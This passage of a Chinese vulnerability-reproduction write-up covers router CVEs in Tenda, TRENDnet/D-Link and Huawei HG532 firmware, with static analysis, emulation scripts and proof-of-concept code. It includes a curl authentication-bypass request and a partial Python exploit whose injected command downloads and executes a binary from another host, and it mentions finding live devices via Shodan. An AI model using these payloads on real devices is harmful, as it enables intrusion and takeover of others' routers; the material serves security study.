</span></span><span class="line"><span class="cl">$ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 进入SaTC容器中</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据</span>
</span></span><span class="line"><span class="cl">$ ls /home/satc/SaTC/SaTC_data
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> ~/SaTC
</span></span><span class="line"><span class="cl"><span class="c1"># 测试/bin/httpd是否存在命令注入漏洞</span>
</span></span><span class="line"><span class="cl">$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script<span class="o">=</span>ref2sink_cmdi -b httpd --taint_check
</span></span><span class="line"><span class="cl"><span class="c1"># 测试/bin/httpd是否存在缓冲区溢出漏洞</span>
</span></span><span class="line"><span class="cl">$ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script<span class="o">=</span>ref2sink_bof -b httpd --taint_check
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240225123452035" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/IlMc42dfUbLruGW.png"/>
</figure>
</p>
<p>过程中可能会飘红，或者警告，可以直接忽略</p>
<p>只要在<code>/home/satc/res</code>下找到txt文件</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">binary: /home/satc/SaTC/SaTC_data/bin/httpd
</span></span><span class="line"><span class="cl">configfile: /home/satc/res/ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result-alter2
</span></span><span class="line"><span class="cl">0xef168 0xa1808   not found
</span></span><span class="line"><span class="cl"><span class="sb">```</span>
</span></span><span class="line"><span class="cl">0xf2208 0xa6890   found : 0xa68f8
</span></span><span class="line"><span class="cl"><span class="sb">```</span>
</span></span><span class="line"><span class="cl">0xefb24 0xa2994   not found
</span></span><span class="line"><span class="cl">total cases: <span class="m">110</span>
</span></span><span class="line"><span class="cl">find cases: <span class="m">1</span>
</span></span><span class="line"><span class="cl">binary: /home/satc/SaTC/SaTC_data/bin/httpd
</span></span><span class="line"><span class="cl">configfile: /home/satc/res/ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result-alter2
</span></span></code></pre></div><p>IDA下查看<code>0xa68f8</code>地址发现是<code>formsetUsbUnload</code>函数，查看其伪代码分析漏洞</p>
<div class="anchor" id="漏洞分析-4"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-4" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>
<figure>
<img alt="image-20240225130344648" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/DqpkzClPMhIS76i.png"/>
</figure>
</p>
<p>可以看到deviceName参数被借传到了<code>doSystemCmd</code>函数中，这将导致一个任意的命令执行</p>
<div class="anchor" id="cve-2023-30135"></div>
<h3 class="relative group">CVE-2023-30135 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2023-30135" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-6"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-6" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2023-30135</li>
<li>漏洞类型： 命令注入</li>
<li>漏洞利用效果：执行任意系统命令</li>
<li>漏洞披露时间：2023.05.04</li>
<li>漏洞描述： Tenda AC18 v15.03.05.19（6318_）cn 已通过 setUsbUnload 函数中的 deviceName 参数发现包含命令注入漏洞</li>
<li>设备型号：Tenda AC18 v15.03.05.19（6318_）cn</li>
<li>设备架构：arm</li>
<li>复现进度：
<ul>
<li>静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：httpd</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>SaTC</li>
<li>IDA</li>
</ul>
</li>
</ul>
<div class="anchor" id="漏洞分析-5"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-5" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>与CVE-2020–10987相同：</p>
<p>
<figure>
<img alt="image-20240225130344648" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/DqpkzClPMhIS76i.png"/>
</figure>
</p>
<p>将deviceName参数借传到了<code>doSystemCmd</code>函数中的，将导致一个任意的命令执行</p>
<div class="anchor" id="trendnet"></div>
<h2 class="relative group">TRENDnet 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#trendnet" style="text-decoration-line: none !important;">#</a></span>
</h2>
<div class="anchor" id="cve-2018-7034"></div>
<h3 class="relative group">CVE-2018-7034 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2018-7034" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-7"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-7" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2018-7034</li>
<li>漏洞类型： 权限绕过漏洞</li>
<li>漏洞利用效果：获取到登录的用户名和密码，成功登录后台</li>
<li>漏洞披露时间：2018.02.14</li>
<li>漏洞描述： 允许通过AUTHORIZED_GROUP=1值绕过身份验证</li>
<li>设备型号：TRENDnet TEW-751DR v1.03B03, TEW-752DRU v1.03B01, TEW733GR v1.03B01，此外<code>D-Link</code>的一些老设备，如<code>DIR645</code>，<code>DIR815</code>等也都受该漏洞影响</li>
<li>设备架构：mips</li>
<li>复现进度：
<ul>
<li>漏洞复现</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：</li>
<li>功能：</li>
<li>技术栈：（脚本语言）</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>直接审计php代码</li>
<li>IDA</li>
</ul>
</li>
</ul>
<div class="anchor" id="漏洞分析-6"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-6" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>详细分析可以看<a href="https://zikh26.github.io/posts/5f982ad5.html" target="_blank">
    ZIKH26师傅的文章</a>，写得非常清楚</p>
<p>查看<code>htdocs/web/getcfg.php</code>：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="nx">OK</span>
</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">xml</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="k">echo</span> <span class="s2">"&lt;?"</span><span class="p">;</span><span class="cp">?&gt;</span><span class="err">xml version="1.0" encoding="utf-8"&lt;?echo "?&gt;";?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;postxml&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;? include "/htdocs/phplib/trace.php";
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if ($_POST["CACHE"] == "true")
</span></span></span><span class="line"><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="cl"><span class="err">	echo dump(1, "/runtime/session/".$SESSION_UID."/postxml");
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">else
</span></span></span><span class="line"><span class="cl"><span class="err">{
</span></span></span><span class="line"><span class="cl"><span class="err">	if($AUTHORIZED_GROUP &lt; 0)
</span></span></span><span class="line"><span class="cl"><span class="err">	{
</span></span></span><span class="line"><span class="cl"><span class="err">		/* not a power user, return error message */
</span></span></span><span class="line"><span class="cl"><span class="err">		echo "\t&lt;result&gt;FAILED&lt;/result&gt;\n";
</span></span></span><span class="line"><span class="cl"><span class="err">		echo "\t&lt;message&gt;Not authorized&lt;/message&gt;\n";
</span></span></span><span class="line"><span class="cl"><span class="err">	}
</span></span></span><span class="line"><span class="cl"><span class="err">	else
</span></span></span><span class="line"><span class="cl"><span class="err">	{
</span></span></span><span class="line"><span class="cl"><span class="err">		/* cut_count() will return 0 when no or only one token. */
</span></span></span><span class="line"><span class="cl"><span class="err">		$SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
</span></span></span><span class="line"><span class="cl"><span class="err">		TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
</span></span></span><span class="line"><span class="cl"><span class="err">		$SERVICE_INDEX = 0;
</span></span></span><span class="line"><span class="cl"><span class="err">		while ($SERVICE_INDEX &lt; $SERVICE_COUNT)
</span></span></span><span class="line"><span class="cl"><span class="err">		{
</span></span></span><span class="line"><span class="cl"><span class="err">			$GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
</span></span></span><span class="line"><span class="cl"><span class="err">			TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
</span></span></span><span class="line"><span class="cl"><span class="err">			if ($GETCFG_SVC!="")
</span></span></span><span class="line"><span class="cl"><span class="err">			{
</span></span></span><span class="line"><span class="cl"><span class="err">				$file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
</span></span></span><span class="line"><span class="cl"><span class="err">				/* GETCFG_SVC will be passed to the child process. */
</span></span></span><span class="line"><span class="cl"><span class="err">				if (isfile($file)=="1") dophp("load", $file);
</span></span></span><span class="line"><span class="cl"><span class="err">			}
</span></span></span><span class="line"><span class="cl"><span class="err">			$SERVICE_INDEX++;
</span></span></span><span class="line"><span class="cl"><span class="err">		}
</span></span></span><span class="line"><span class="cl"><span class="err">	}
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;&lt;/postxml&gt;
</span></span></span></code></pre></div><p>该漏洞的利用是通过发送 <code>POST</code> 报文在正常字段 <code>SERVICES=DEVICE.ACCOUNT</code> 后紧跟了一个 <code>AUTHORIZED_GROUP=1</code> （二者用 <code>%0a</code> 连接），导致 <code>cgibin</code> 文件解析时先识别到了第一个 <code>=</code> ，认为 <code>SERVICES</code> 是键，<code>DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1</code> 是值。随后又对字符串进行解码，<code>%0a</code> 处理为 <code>\n</code>，此时内存中字符串为 <code>_POST_SERVICES=DEVICE.ACCOUNT\nAUTHORIZED_GROUP=1</code> ，后续在 <code>cgibin</code> 中认证失败，在此基础上添加了 <code>AUTHORIZED_GROUP=-1</code></p>
<p>之后把整个数据发送给 <code>php</code> 文件进行处理， <code>getcfg.php</code> 文件中<code>if($AUTHORIZED_GROUP &lt; 0)</code> 获取字段值时，首先解析到的是 <code>AUTHORIZED_GROUP=1</code> 从而通过了验证。又因为可以加载 <code>htdocs/webinc/getcfg</code> 目录下的任意文件，最终造成敏感文件的信息泄露</p>
<p>将POST发送的内容设为<code>SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1</code>即可完成</p>
<div class="anchor" id="漏洞复现-4"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-4" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>这里在我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>掉，因此，在本地是不好复现的，<del>不过，我们可以打远程。</del></p>
<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/search?query=tew-751dr" target="_blank">
    https://www.shodan.io/search?query=tew-751dr</a> ） 查找到还在用此路由器设备的站点</del></p>
<p>可以复现漏洞，但是这样的行为不太好（）</p>
<p><code>POC</code>如下：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -d <span class="s2">"SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"</span> <span class="s2">"http://某ip/getcfg.php"</span>
</span></span></code></pre></div><div class="anchor" id="huawei"></div>
<h2 class="relative group">HUAWEI 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#huawei" style="text-decoration-line: none !important;">#</a></span>
</h2>
<div class="anchor" id="cve-2017-17215"></div>
<h3 class="relative group">CVE-2017-17215 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2017-17215" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-8"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-8" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2017-17215</li>
<li>漏洞类型： 远程命令执行（RCE）</li>
<li>漏洞利用效果：注入任意命令并执行</li>
<li>漏洞披露时间：20171204</li>
<li>漏洞描述：
<ul>
<li>华为HG532存在远程代码执行漏洞。经身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击。成功利用这个漏洞可以导致远程执行任意代码</li>
</ul>
</li>
<li>设备型号：HG532</li>
<li>设备架构：mips</li>
<li>复现进度：
<ul>
<li>已成功在本地复现漏洞</li>
<li>已进行静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：upnp</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>静态分析工具
<ul>
<li>ida(32位)</li>
<li>ghidra</li>
</ul>
</li>
<li>动态分析工具
<ul>
<li>gdb-multiarch</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="anchor" id="解包-5"></div>
<h4 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85-5" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">### 安装sasquatch</span>
</span></span><span class="line"><span class="cl">$ sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev
</span></span><span class="line"><span class="cl">$ git clone https://github.com/devttys0/sasquatch.git
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> sasquatch <span class="o">&amp;&amp;</span> ./build.sh
</span></span></code></pre></div><div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ binwalk -Me HG532eV100R001C02B015_upgrade_main.bin
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> _HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root/bin/
</span></span><span class="line"><span class="cl">$ checksec upnp
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240223015032209" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/9GgbdHJwQWL1Auz.png"/>
</figure>
</p>
<div class="anchor" id="漏洞分析-7"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-7" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>搜索<code>NewStatusURL</code>字符串，在<code>0x00407B20</code>的地址上创建函数




  <figure>
<img alt="image-20240223020449570" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/ruKzhlBU6cJEV1i.png"/>
</figure>
</p>
<p>然后看sub_407B20的伪代码</p>
<p>
<figure>
<img alt="image-20240223020727449" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/hnBLiDyYEvUNV1a.png"/>
</figure>
</p>
<p>观察到<code>snprintf</code>函数会将我们发送的标签的内容写入字符串，并在之后会用<code>system</code>执行该字符串，这就很明显会存在一个<strong>任意命令执行</strong>的漏洞，我们可以将<code>;&lt;cmd&gt;;</code>写入标签，由于<code>;</code>可连接两个独立语句并执行，因此，就能执行我们的<code>cmd</code>命令了。</p>
<p>这里的反编译其实有些问题，应该是：<code>snprintf(v6, 1024, "upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -b", v4, v5);</code>，这里少了个参数。</p>
<p>至此，我们发现，可以在<code>NewStatusURL</code>或<code>NewDownloadURL</code>标签中注入任意命令以执行。</p>
<div class="anchor" id="漏洞复现-5"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-5" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ./fat.py /path/to/firmware
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240223021726180" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/89ihSOXJv4ge1KF.png"/>
</figure>
</p>
<ul>
<li>可以仿真，但是upnp服务不可用，所以无法复现漏洞</li>
</ul>
<p>后来搜索到了网上复现记录</p>
<p><a href="https://github.com/Vu1nT0tal/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215" target="_blank">
    IoT-vulhub/HUAWEI/CVE-2017-17215 at master · Vu1nT0tal/IoT-vulhub (github.com)</a></p>
<p>按照上面的步骤来复现：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ sudo docker build -t firmianay/qemu-system:mips .          
</span></span></code></pre></div><p>其中run.sh的内容为：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># 启动 ssh 服务</span>
</span></span><span class="line"><span class="cl">/etc/init.d/ssh start
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 配置网卡</span>
</span></span><span class="line"><span class="cl">tunctl -t tap0
</span></span><span class="line"><span class="cl">ifconfig tap0 192.168.2.1/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 启动 http 服务</span>
</span></span><span class="line"><span class="cl">nohup python3 -m http.server <span class="m">8000</span> 1&gt;<span class="p">&amp;</span>/dev/null <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 进入 qemu 镜像目录</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root/images
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/usr/bin/expect<span class="s">&lt;&lt;EOF
</span></span></span><span class="line"><span class="cl"><span class="s">set timeout 10000
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">spawn qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "debian-mips login:"
</span></span></span><span class="line"><span class="cl"><span class="s">send "root\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "Password:"
</span></span></span><span class="line"><span class="cl"><span class="s">send "root\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "ifconfig eth0 192.168.2.2/24\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">#expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">#send "echo 0 &gt; /proc/sys/kernel/randomize_va_space\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "scp root@192.168.2.1:/root/squashfs-root.tar.gz /root/squashfs-root.tar.gz\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect {
</span></span></span><span class="line"><span class="cl"><span class="s">    "(yes/no)? " { send "yes\r"; exp_continue }
</span></span></span><span class="line"><span class="cl"><span class="s">    "password: " { send "root\r" }
</span></span></span><span class="line"><span class="cl"><span class="s">}
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "tar xzf squashfs-root.tar.gz &amp;&amp; rm squashfs-root.tar.gz\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "mount -o bind /dev ./squashfs-root/dev &amp;&amp; mount -t proc /proc ./squashfs-root/proc\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "scp -r root@192.168.2.1:/root/tools /root/squashfs-root/tools\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect {
</span></span></span><span class="line"><span class="cl"><span class="s">    "(yes/no)? " { send "yes\r"; exp_continue }
</span></span></span><span class="line"><span class="cl"><span class="s">    "password: " { send "root\r" }
</span></span></span><span class="line"><span class="cl"><span class="s">}
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "echo 'sleep 30' &gt; net.sh\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "echo 'ifconfig eth0 192.168.2.2/24' &gt;&gt; net.sh\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "echo 'ifconfig br0 192.168.2.3/24' &gt;&gt; net.sh\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "chmod +x net.sh &amp;&amp; /bin/sh net.sh &amp;\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect "root@debian-mips:~# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "chroot squashfs-root/ sh\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "./bin/upnp\r"
</span></span></span><span class="line"><span class="cl"><span class="s">expect "# "
</span></span></span><span class="line"><span class="cl"><span class="s">send "./bin/mic\r"
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">expect eof
</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240223214204231" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/DIngR3w9ObXV6x4.png"/>
</figure>
</p>
<p>成功仿真！</p>
<p>最后，我们就可以打<code>exp</code>并成功复现完<code>CVE-2017-17215</code>这个漏洞了！</p>
<p>exp:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPDigestAuth</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cmd</span>  <span class="o">=</span> <span class="s1">'wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf</span><span class="se">\n</span><span class="s1">'</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">+=</span> <span class="s1">'chmod 777 /msf</span><span class="se">\n</span><span class="s1">'</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">+=</span> <span class="s1">'/msf'</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">255</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">"&lt;?xml version=</span><span class="se">\"</span><span class="s2">1.0</span><span class="se">\"</span><span class="s2"> ?&gt;</span><span class="se">\n</span><span class="s2">    &lt;s:Envelope xmlns:s=</span><span class="se">\"</span><span class="s2">http://schemas.xmlsoap.org/soap/envelope/</span><span class="se">\"</span><span class="s2"> s:encodingStyle=</span><span class="se">\"</span><span class="s2">http://schemas.xmlsoap.org/soap/encoding/</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=</span><span class="se">\"</span><span class="s2">urn:schemas-upnp-org:service:WANPPPConnection:1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">    &lt;NewStatusURL&gt;$("</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s2">")&lt;/NewStatusURL&gt;</span><span class="se">\n</span><span class="s2">&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><span class="se">\n</span><span class="s2">&lt;/u:Upgrade&gt;</span><span class="se">\n</span><span class="s2">    &lt;/s:Body&gt;</span><span class="se">\n</span><span class="s2">    &lt;/s:Envelope&gt;"</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1"</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
